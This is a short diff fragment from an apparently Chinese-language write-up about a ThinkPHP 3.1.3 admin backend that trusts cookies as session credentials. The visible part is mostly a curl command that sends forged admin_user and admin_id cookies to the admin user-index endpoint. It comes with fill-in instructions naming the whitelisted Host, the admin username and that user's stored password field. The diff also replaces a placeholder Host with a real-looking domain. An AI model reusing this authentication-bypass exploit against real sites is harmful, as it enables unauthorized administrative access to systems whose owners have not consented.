@@ -22,7 +22,7 @@ ThinkPHP 3.1.3 后台把 Cookie 直接当会话凭据：admin_user=admin.usernam
 
 ```
 curl -k -s --noproxy '*' \
-  -H "Host: target385.example.com" \
+  -H "Host: example.jbg.mysqbbthisgoodsfor33333user.top" \
   -H "Cookie: admin_user=the; admin_id=b515a2b93dbec89932bf86fec3466f44" \
   "https://203.0.113.22/example.com?g=Admin&m=User&a=index"
 需替换：Host（白名单域名）、admin_user（admin 表 username）、admin_id（该行 password 字段）。
